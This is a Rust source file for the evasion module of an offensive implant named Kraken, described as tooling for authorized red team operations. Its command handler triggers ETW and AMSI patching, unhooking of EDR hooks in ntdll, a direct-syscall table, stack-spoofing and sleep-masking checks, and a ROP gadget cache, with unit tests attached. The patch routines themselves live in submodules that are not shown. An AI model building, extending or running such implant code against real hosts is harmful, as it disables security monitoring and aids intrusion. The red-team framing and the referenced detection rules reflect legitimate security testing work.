//! mod-evasion: ETW, AMSI, and ntdll evasion module for Kraken implant
//!
//! Phase 4 OPSEC module for authorized red team operations.
//! Detection rules: wiki/detection/yara/kraken_opsec.yar
//!
//! Provides:
//! - ETW patching to disable telemetry
//! - AMSI patching to bypass script scanning
//! - ntdll unhooking to remove EDR inline hooks
//! - Syscall extraction for direct invocation (Hell's Gate)
//! - Stack spoofing for call stack evasion
//! - ROP gadget discovery
//!
//! Commands:
//! - "status": Show current patch status
//! - "patch_etw": Apply ETW patch
//! - "patch_amsi": Apply AMSI patch
//! - "patch_all": Apply both patches
//! - "unhook": Unhook ntdll (auto-selects best method)
//! - "unhook_disk": Unhook ntdll from disk
//! - "unhook_knowndlls": Unhook ntdll from KnownDlls
//! - "syscall_table": Build syscall table for direct invocation
//! - "spoof_info": Get stack spoofing capability info
//! - "gadgets": Build ROP gadget cache
//! - "sleep_mask_info": Check sleep masking capability

pub mod amsi;
pub mod etw;
pub mod gadgets;
pub mod rop;
pub mod sleep_mask;
pub mod stack_spoof;
pub mod unhook;

use std::sync::atomic::{AtomicBool, Ordering};

use common::{KrakenError, Module, ModuleId, TaskId, TaskResult};

/// Evasion module for ETW, AMSI bypass, and ntdll unhooking
pub struct EvasionModule {
    id: ModuleId,
    etw_patched: AtomicBool,
    amsi_patched: AtomicBool,
    ntdll_unhooked: AtomicBool,
}

impl EvasionModule {
    pub fn new() -> Self {
        Self {
            id: ModuleId::new("evasion"),
            etw_patched: AtomicBool::new(false),
            amsi_patched: AtomicBool::new(false),
            ntdll_unhooked: AtomicBool::new(false),
        }
    }

    /// Get current patch status as formatted string
    fn status(&self) -> String {
        format!(
            "ETW: {}, AMSI: {}, ntdll: {}",
            if self.etw_patched.load(Ordering::Relaxed) {
                "patched"
            } else {
                "active"
            },
            if self.amsi_patched.load(Ordering::Relaxed) {
                "patched"
            } else {
                "active"
            },
            if self.ntdll_unhooked.load(Ordering::Relaxed) {
                "unhooked"
            } else {
                "hooked"
            }
        )
    }

    /// Apply ETW patches
    fn do_patch_etw(&self) -> Result<String, KrakenError> {
        // Check if already patched
        if self.etw_patched.load(Ordering::Relaxed) {
            return Ok("ETW already patched".to_string());
        }

        // Apply the actual patch
        #[cfg(target_os = "windows")]
        {
            // SAFETY: ETW patching modifies ntdll code - only for authorized use
            unsafe {
                let status = etw::patch_all_etw()?;
                self.etw_patched.store(true, Ordering::Relaxed);

                Ok(format!(
                    "ETW patched: EtwEventWrite={}, NtTraceEvent={}",
                    if status.etw_event_write_patched {
                        "success"
                    } else {
                        "failed"
                    },
                    if status.nt_trace_event_patched {
                        "success"
                    } else {
                        "failed"
                    }
                ))
            }
        }

        #[cfg(not(target_os = "windows"))]
        {
            etw::patch_all_etw()?;
            unreachable!()
        }
    }

    /// Apply AMSI patches
    fn do_patch_amsi(&self) -> Result<String, KrakenError> {
        // Check if already patched
        if self.amsi_patched.load(Ordering::Relaxed) {
            return Ok("AMSI already patched".to_string());
        }

        // Apply the actual patch
        #[cfg(target_os = "windows")]
        {
            // SAFETY: AMSI patching modifies amsi.dll code - only for authorized use
            unsafe {
                let status = amsi::patch_all_amsi()?;
                self.amsi_patched.store(true, Ordering::Relaxed);

                Ok(format!(
                    "AMSI patched: AmsiScanBuffer={}, AmsiScanString={}",
                    if status.amsi_scan_buffer_patched {
                        "success"
                    } else {
                        "failed"
                    },
                    if status.amsi_scan_string_patched {
                        "success"
                    } else {
                        "failed"
                    }
                ))
            }
        }

        #[cfg(not(target_os = "windows"))]
        {
            amsi::patch_all_amsi()?;
            unreachable!()
        }
    }

    /// Apply all patches
    fn do_patch_all(&self) -> Result<String, KrakenError> {
        let mut results = Vec::new();

        match self.do_patch_etw() {
            Ok(msg) => results.push(format!("ETW: {}", msg)),
            Err(e) => results.push(format!("ETW: failed - {}", e)),
        }

        match self.do_patch_amsi() {
            Ok(msg) => results.push(format!("AMSI: {}", msg)),
            Err(e) => results.push(format!("AMSI: failed - {}", e)),
        }

        Ok(results.join("; "))
    }

    /// Unhook ntdll using the best available method
    fn do_unhook(&self) -> Result<String, KrakenError> {
        if self.ntdll_unhooked.load(Ordering::Relaxed) {
            return Ok("ntdll already unhooked".to_string());
        }

        let result = unhook::unhook_ntdll()?;
        self.ntdll_unhooked.store(true, Ordering::Relaxed);

        Ok(format!(
            "ntdll unhooked via {}: {} bytes restored",
            result.method, result.bytes_restored
        ))
    }

    /// Unhook ntdll specifically from disk
    fn do_unhook_disk(&self) -> Result<String, KrakenError> {
        if self.ntdll_unhooked.load(Ordering::Relaxed) {
            return Ok("ntdll already unhooked".to_string());
        }

        let result = unhook::unhook_ntdll_disk()?;
        self.ntdll_unhooked.store(true, Ordering::Relaxed);

        Ok(format!(
            "ntdll unhooked from disk: {} bytes restored",
            result.bytes_restored
        ))
    }

    /// Unhook ntdll specifically from KnownDlls
    fn do_unhook_knowndlls(&self) -> Result<String, KrakenError> {
        if self.ntdll_unhooked.load(Ordering::Relaxed) {
            return Ok("ntdll already unhooked".to_string());
        }

        let result = unhook::unhook_ntdll_knowndlls()?;
        self.ntdll_unhooked.store(true, Ordering::Relaxed);

        Ok(format!(
            "ntdll unhooked from KnownDlls: {} bytes restored",
            result.bytes_restored
        ))
    }

    /// Build syscall table for direct invocation
    #[cfg(target_os = "windows")]
    fn do_build_syscall_table(&self) -> Result<String, KrakenError> {
        let table = unhook::build_syscall_table()?;
        Ok(format!(
            "syscall table built: NtAllocateVirtualMemory={:#x}, NtProtectVirtualMemory={:#x}, NtClose={:#x}",
            table.nt_allocate_virtual_memory,
            table.nt_protect_virtual_memory,
            table.nt_close
        ))
    }

    #[cfg(not(target_os = "windows"))]
    fn do_build_syscall_table(&self) -> Result<String, KrakenError> {
        Err(KrakenError::Module(
            "syscall table only supported on Windows".into(),
        ))
    }

    /// Get stack spoofing info
    fn do_spoof_info(&self) -> Result<String, KrakenError> {
        let info = stack_spoof::get_spoof_info();
        if info.spoofed {
            Ok(format!(
                "stack spoofing available: {} frames from {:?}",
                info.frame_count, info.source_modules
            ))
        } else {
            Ok("stack spoofing not available on this platform".to_string())
        }
    }

    /// Build gadget cache
    fn do_build_gadgets(&self) -> Result<String, KrakenError> {
        let cache = gadgets::GadgetCache::build();
        if cache.has_required_gadgets() {
            #[cfg(target_os = "windows")]
            {
                Ok(format!(
                    "gadget cache built: pop_rcx={:#x?}, pop_rdx={:#x?}, ret={:#x?}",
                    cache.pop_rcx_ret, cache.pop_rdx_ret, cache.ret
                ))
            }
            #[cfg(not(target_os = "windows"))]
            {
                Ok("gadget cache not available on this platform".to_string())
            }
        } else {
            Ok("gadget cache: insufficient gadgets found".to_string())
        }
    }

    /// Get sleep masking info
    fn do_sleep_mask_info(&self) -> Result<String, KrakenError> {
        let can_mask = sleep_mask::can_sleep_mask();
        let image_info = sleep_mask::get_image_info();

        match (can_mask, image_info) {
            (true, Some((base, size))) => Ok(format!(
                "sleep masking available: image_base={:#x}, image_size={:#x}",
                base, size
            )),
            (true, None) => Ok("sleep masking available but image info unavailable".to_string()),
            (false, _) => Ok("sleep masking not available on this platform".to_string()),
        }
    }
}

impl Default for EvasionModule {
    fn default() -> Self {
        Self::new()
    }
}

impl Module for EvasionModule {
    fn id(&self) -> &ModuleId {
        &self.id
    }

    fn name(&self) -> &'static str {
        "Evasion"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        let cmd = std::str::from_utf8(task_data)
            .map_err(|_| KrakenError::Module("invalid UTF-8 in command".into()))?;

        match cmd.trim() {
            "status" => {
                let status = self.status();
                Ok(TaskResult::ModuleOperation(common::ModuleOperationResult {
                    operation: "status".into(),
                    module_id: self.id.as_str().to_string(),
                    success: true,
                    message: Some(status),
                }))
            }
            "patch_etw" => {
                let result = self.do_patch_etw();
                match result {
                    Ok(msg) => Ok(TaskResult::ModuleOperation(common::ModuleOperationResult {
                        operation: "patch_etw".into(),
                        module_id: self.id.as_str().to_string(),
                        success: true,
                        message: Some(msg),
                    })),
                    Err(e) => Ok(TaskResult::ModuleOperation(common::ModuleOperationResult {
                        operation: "patch_etw".into(),
                        module_id: self.id.as_str().to_string(),
                        success: false,
                        message: Some(format!("ETW patch failed: {}", e)),
                    })),
                }
            }
            "patch_amsi" => {
                let result = self.do_patch_amsi();
                match result {
                    Ok(msg) => Ok(TaskResult::ModuleOperation(common::ModuleOperationResult {
                        operation: "patch_amsi".into(),
                        module_id: self.id.as_str().to_string(),
                        success: true,
                        message: Some(msg),
                    })),
                    Err(e) => Ok(TaskResult::ModuleOperation(common::ModuleOperationResult {
                        operation: "patch_amsi".into(),
                        module_id: self.id.as_str().to_string(),
                        success: false,
                        message: Some(format!("AMSI patch failed: {}", e)),
                    })),
                }
            }
            "patch_all" => {
                let result = self.do_patch_all();
                match result {
                    Ok(msg) => Ok(TaskResult::ModuleOperation(common::ModuleOperationResult {
                        operation: "patch_all".into(),
                        module_id: self.id.as_str().to_string(),
                        success: true,
                        message: Some(msg),
                    })),
                    Err(e) => Ok(TaskResult::ModuleOperation(common::ModuleOperationResult {
                        operation: "patch_all".into(),
                        module_id: self.id.as_str().to_string(),
                        success: false,
                        message: Some(format!("Patches failed: {}", e)),
                    })),
                }
            }
            "unhook" => {
                let result = self.do_unhook();
                match result {
                    Ok(msg) => Ok(TaskResult::ModuleOperation(common::ModuleOperationResult {
                        operation: "unhook".into(),
                        module_id: self.id.as_str().to_string(),
                        success: true,
                        message: Some(msg),
                    })),
                    Err(e) => Ok(TaskResult::ModuleOperation(common::ModuleOperationResult {
                        operation: "unhook".into(),
                        module_id: self.id.as_str().to_string(),
                        success: false,
                        message: Some(format!("Unhook failed: {}", e)),
                    })),
                }
            }
            "unhook_disk" => {
                let result = self.do_unhook_disk();
                match result {
                    Ok(msg) => Ok(TaskResult::ModuleOperation(common::ModuleOperationResult {
                        operation: "unhook_disk".into(),
                        module_id: self.id.as_str().to_string(),
                        success: true,
                        message: Some(msg),
                    })),
                    Err(e) => Ok(TaskResult::ModuleOperation(common::ModuleOperationResult {
                        operation: "unhook_disk".into(),
                        module_id: self.id.as_str().to_string(),
                        success: false,
                        message: Some(format!("Unhook failed: {}", e)),
                    })),
                }
            }
            "unhook_knowndlls" => {
                let result = self.do_unhook_knowndlls();
                match result {
                    Ok(msg) => Ok(TaskResult::ModuleOperation(common::ModuleOperationResult {
                        operation: "unhook_knowndlls".into(),
                        module_id: self.id.as_str().to_string(),
                        success: true,
                        message: Some(msg),
                    })),
                    Err(e) => Ok(TaskResult::ModuleOperation(common::ModuleOperationResult {
                        operation: "unhook_knowndlls".into(),
                        module_id: self.id.as_str().to_string(),
                        success: false,
                        message: Some(format!("Unhook failed: {}", e)),
                    })),
                }
            }
            "syscall_table" => {
                let result = self.do_build_syscall_table();
                match result {
                    Ok(msg) => Ok(TaskResult::ModuleOperation(common::ModuleOperationResult {
                        operation: "syscall_table".into(),
                        module_id: self.id.as_str().to_string(),
                        success: true,
                        message: Some(msg),
                    })),
                    Err(e) => Ok(TaskResult::ModuleOperation(common::ModuleOperationResult {
                        operation: "syscall_table".into(),
                        module_id: self.id.as_str().to_string(),
                        success: false,
                        message: Some(format!("Syscall table build failed: {}", e)),
                    })),
                }
            }
            "spoof_info" => {
                let result = self.do_spoof_info();
                match result {
                    Ok(msg) => Ok(TaskResult::ModuleOperation(common::ModuleOperationResult {
                        operation: "spoof_info".into(),
                        module_id: self.id.as_str().to_string(),
                        success: true,
                        message: Some(msg),
                    })),
                    Err(e) => Ok(TaskResult::ModuleOperation(common::ModuleOperationResult {
                        operation: "spoof_info".into(),
                        module_id: self.id.as_str().to_string(),
                        success: false,
                        message: Some(format!("Spoof info failed: {}", e)),
                    })),
                }
            }
            "gadgets" => {
                let result = self.do_build_gadgets();
                match result {
                    Ok(msg) => Ok(TaskResult::ModuleOperation(common::ModuleOperationResult {
                        operation: "gadgets".into(),
                        module_id: self.id.as_str().to_string(),
                        success: true,
                        message: Some(msg),
                    })),
                    Err(e) => Ok(TaskResult::ModuleOperation(common::ModuleOperationResult {
                        operation: "gadgets".into(),
                        module_id: self.id.as_str().to_string(),
                        success: false,
                        message: Some(format!("Gadget build failed: {}", e)),
                    })),
                }
            }
            "sleep_mask_info" => {
                let result = self.do_sleep_mask_info();
                match result {
                    Ok(msg) => Ok(TaskResult::ModuleOperation(common::ModuleOperationResult {
                        operation: "sleep_mask_info".into(),
                        module_id: self.id.as_str().to_string(),
                        success: true,
                        message: Some(msg),
                    })),
                    Err(e) => Ok(TaskResult::ModuleOperation(common::ModuleOperationResult {
                        operation: "sleep_mask_info".into(),
                        module_id: self.id.as_str().to_string(),
                        success: false,
                        message: Some(format!("Sleep mask info failed: {}", e)),
                    })),
                }
            }
            _ => Err(KrakenError::Module(format!(
                "unknown evasion command: {}",
                cmd.trim()
            ))),
        }
    }
}

// For dynamic loading support (only emitted when building standalone dynamic module)
#[cfg(feature = "dynamic-entry")]
common::kraken_module_entry!(EvasionModule);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_module_id() {
        let module = EvasionModule::new();
        assert_eq!(module.id().as_str(), "evasion");
        assert_eq!(module.name(), "Evasion");
    }

    #[test]
    fn test_status_command() {
        let module = EvasionModule::new();
        let result = module.handle(TaskId::new(), b"status");

        assert!(result.is_ok());
        if let Ok(TaskResult::ModuleOperation(op)) = result {
            assert_eq!(op.operation, "status");
            assert!(op.success);
            let msg = op.message.unwrap();
            assert!(msg.contains("ETW: active"));
            assert!(msg.contains("AMSI: active"));
        } else {
            panic!("unexpected result type");
        }
    }

    #[test]
    fn test_unknown_command() {
        let module = EvasionModule::new();
        let result = module.handle(TaskId::new(), b"unknown");

        assert!(result.is_err());
        if let Err(KrakenError::Module(msg)) = result {
            assert!(msg.contains("unknown evasion command"));
        }
    }

    #[test]
    fn test_patch_etw_command() {
        let module = EvasionModule::new();
        let result = module.handle(TaskId::new(), b"patch_etw");

        // On non-Windows, this returns a result with success=false
        // On Windows, it would actually attempt the patch
        assert!(result.is_ok());
        if let Ok(TaskResult::ModuleOperation(op)) = result {
            assert_eq!(op.operation, "patch_etw");
            // On non-Windows, patching fails but command succeeds
            #[cfg(not(target_os = "windows"))]
            assert!(!op.success);
        } else {
            panic!("unexpected result type");
        }
    }

    #[test]
    fn test_patch_amsi_command() {
        let module = EvasionModule::new();
        let result = module.handle(TaskId::new(), b"patch_amsi");

        assert!(result.is_ok());
        if let Ok(TaskResult::ModuleOperation(op)) = result {
            assert_eq!(op.operation, "patch_amsi");
            // AMSI placeholder still "succeeds" on Windows, fails on non-Windows
            #[cfg(not(target_os = "windows"))]
            assert!(!op.success);
        } else {
            panic!("unexpected result type");
        }
    }

    #[test]
    fn test_patch_all_command() {
        let module = EvasionModule::new();
        let result = module.handle(TaskId::new(), b"patch_all");

        assert!(result.is_ok());
        if let Ok(TaskResult::ModuleOperation(op)) = result {
            assert_eq!(op.operation, "patch_all");
            // patch_all returns success even if individual patches fail
            // (it reports results in the message)
            assert!(op.success);
            assert!(op.message.is_some());
        } else {
            panic!("unexpected result type");
        }
    }

    #[test]
    fn test_status_after_patches() {
        let module = EvasionModule::new();

        // Initial status
        assert!(module.status().contains("ETW: active"));
        assert!(module.status().contains("AMSI: active"));

        // After patch attempts (on non-Windows, these fail but don't change status)
        let _ = module.handle(TaskId::new(), b"patch_all");

        // Status reflects patch attempts
        // On Windows: would show "patched"
        // On non-Windows: still shows "active" since patches failed
        let status = module.status();
        assert!(status.contains("ETW:"));
        assert!(status.contains("AMSI:"));
    }
}
